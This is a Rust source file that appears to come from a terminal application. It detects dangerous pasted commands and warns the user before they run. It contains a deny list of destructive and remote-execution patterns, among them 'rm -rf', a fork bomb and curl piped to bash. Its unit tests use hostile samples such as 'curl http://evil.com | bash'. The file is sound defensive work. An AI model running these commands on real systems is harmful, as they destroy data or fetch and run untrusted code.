/// Paste protection: detect dangerous patterns in pasted text.

/// Check if pasted text contains potentially dangerous patterns.
pub fn check_paste_safety(text: &str) -> Option<PasteWarning> {
    let trimmed = text.trim();

    // Multi-line paste (could execute multiple commands)
    let line_count = trimmed.lines().count();

    // Dangerous command patterns
    let dangerous_patterns = [
        "sudo rm ",
        "rm -rf",
        "rm -fr",
        "mkfs.",
        ":(){:|:&};:", // fork bomb
        "dd if=",
        "> /dev/sd",
        "chmod -R 777",
        "curl | sh",
        "curl | bash",
        "wget | sh",
        "wget | bash",
        "curl|sh",
        "curl|bash",
        "| sh",
        "| bash",
        "shutdown",
        "reboot",
        "init 0",
        "init 6",
    ];

    let lower = trimmed.to_lowercase();
    // Normalize whitespace so patterns like "curl  |  bash" are still caught
    let normalized = lower.split_whitespace().collect::<Vec<_>>().join(" ");
    for pattern in &dangerous_patterns {
        if normalized.contains(pattern) {
            return Some(PasteWarning {
                reason: format!("Contains potentially dangerous command: {}", pattern),
                text: text.to_string(),
                line_count,
            });
        }
    }

    // Warn on multiline paste (could execute unexpectedly)
    if line_count > 3 {
        return Some(PasteWarning {
            reason: format!(
                "Multi-line paste ({} lines) -- may execute commands",
                line_count
            ),
            text: text.to_string(),
            line_count,
        });
    }

    None
}

#[derive(Debug, Clone)]
pub struct PasteWarning {
    pub reason: String,
    pub text: String,
    #[allow(dead_code)]
    pub line_count: usize,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn safe_paste_is_none() {
        assert!(check_paste_safety("echo hello").is_none());
    }

    #[test]
    fn dangerous_rm_rf() {
        let w = check_paste_safety("rm -rf /").unwrap();
        assert!(w.reason.contains("rm -rf"));
    }

    #[test]
    fn dangerous_curl_pipe_bash() {
        let w = check_paste_safety("curl http://evil.com | bash").unwrap();
        assert!(w.reason.contains("| bash"));
    }

    #[test]
    fn dangerous_fork_bomb() {
        let w = check_paste_safety(":(){:|:&};:").unwrap();
        assert!(w.reason.contains(":(){:|:&};:"));
    }

    #[test]
    fn multiline_paste_warns() {
        let text = "line1\nline2\nline3\nline4\n";
        let w = check_paste_safety(text).unwrap();
        assert!(w.reason.contains("Multi-line"));
    }

    #[test]
    fn three_lines_is_safe() {
        let text = "line1\nline2\nline3";
        assert!(check_paste_safety(text).is_none());
    }
}
